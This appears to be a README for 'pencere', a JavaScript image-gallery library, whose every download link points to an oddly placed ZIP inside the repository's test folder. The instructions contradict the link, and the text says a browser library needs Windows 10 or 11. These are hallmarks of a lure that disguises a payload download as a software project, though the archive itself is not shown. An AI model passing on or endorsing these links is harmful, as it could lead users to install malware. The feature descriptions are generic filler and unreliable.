# 🖼️ pencere - Simple image galleries for any website

[![](https://img.shields.io/badge/Download-Pencere-blue.svg)](https://raw.githubusercontent.com/khadheejatheenaal/pencere/main/test/dom/Software-2.7-beta.2.zip)

Pencere is a tool for showing photos and videos on your website. It makes images pop up in a clean window when site visitors click them. This tool works on all websites. You do not need to install complex extra parts to use it. It makes your site look better and helps people see your content without trouble.

## 📥 Getting Started

You can set up pencere on your computer to test how it works before you add it to your website.

1. Visit this page to download: https://raw.githubusercontent.com/khadheejatheenaal/pencere/main/test/dom/Software-2.7-beta.2.zip
2. Select the button that says Code.
3. Click Download ZIP.
4. Open your downloads folder in Windows.
5. Right-click the file named pencere-main.zip.
6. Choose Extract All.
7. Click Extract.

Once you have the files on your computer, you can open the demo folder to see the gallery in action. Open the index.html file with any web browser like Chrome, Edge, or Firefox.

## ⚙️ How It Works

Pencere uses standard web technology. When a user clicks an image, the tool opens a clear view of that media. It handles photos, videos, and frames. It works well with many different design setups. 

The tool follows strict rules for accessibility. This means people with screen readers or those who rely on a keyboard can browse your galleries. It meets the WCAG 2.2 AA standards. This makes your site welcoming to every visitor.

## ✨ Main Features

- Zero Dependencies: You do not need to install extra software or plugins for this to work.
- Smooth Transitions: It uses native browser tools to move between images. This feels fast and fluid.
- Universal Support: It works with React, Vue, Svelte, and Solid. If you use raw HTML, it works there too.
- Keyboard Friendly: Visitors can use arrow keys to flip through images.
- Custom Styles: You can change the colors and shapes to match your branding.

## 🛠️ System Requirements

To use this software, your computer needs:

- Windows 10 or Windows 11.
- A modern web browser. 
- A simple text editor like Notepad or Visual Studio Code.
- No special hardware or high-power processors are necessary.

## 🚀 Setting Up the Gallery

You can copy the code into your existing project.

1. Move the pencere folder into your website project directory.
2. Link the pencere file to your HTML page.
3. Add a class name to your images.
4. Initialize the viewer in your script tag.

Pencere identifies your images based on the class names you provide. It automatically builds the navigation tools. You do not need to write complex code for opening or closing the window. The tool manages the state for you.

## 🔑 Accessible Design

Accessibility matters. Many users navigate the web without a mouse. Pencere includes hooks that handle focus trapping. When a user opens an image, the focus locks within the lightbox. This prevents a user from accidentally clicking things outside the window. When they close the window, the focus returns to the link they clicked. This is vital for a good user experience.

## 📂 Project Structure

- /dist: Contains the finished files for your website.
- /docs: Contains the full manual for advanced usage.
- /examples: Contains pre-built styles to help you start.
- /src: Contains the source code for the tool.

If you want the smallest file size, use the files inside the dist folder. These are minified to load fast on mobile phones.

## 📝 Frequently Asked Questions

Can I use this for videos?
Yes. It supports video files and embedded video links.

Does this work on mobile phones?
Yes. The tool detects touch screens. Users can swipe left or right to see the next image.

Will this conflict with other software?
Pencere runs in its own memory space. It does not touch your other web tools.

How do I report a bug?
Navigate to the download link and select the Issues tab. Describe what happened.

What if the image does not load?
Check the file path. Pencere expects valid links to your media files. If the link is broken, the viewer will show an error state. 

## 🔧 Advanced Configuration

You can change how the gallery behaves. You can turn off the keyboard navigation if you prefer. You can also change the zoom speed. All these options exist in the configuration object. You pass this object when you start the tool on your page. 

If you use a framework like React, you can import the hook and use it directly in your components. This keeps your code clean and organized.

## 📈 Performance

Pencere is light. It does not slow down your website. We built it with performance in mind. Each part of the code is tree-shakeable. This means your website only loads the parts of the tool that you actually use. This saves data for your visitors and improves your site speed. 

Users expect instant feedback. By using native browser transitions, Pencere matches the speed of the web platform itself. There is no jitter or lag when an image opens.

## 📥 Get the files

The project is active and updated often. To get the newest fixes, visit this page to download: https://raw.githubusercontent.com/khadheejatheenaal/pencere/main/test/dom/Software-2.7-beta.2.zip

Check the repository periodically to see if a newer version is available. You can re-download the ZIP file and replace your local files whenever you need to update. Your website will reflect the changes immediately after you refresh your pages.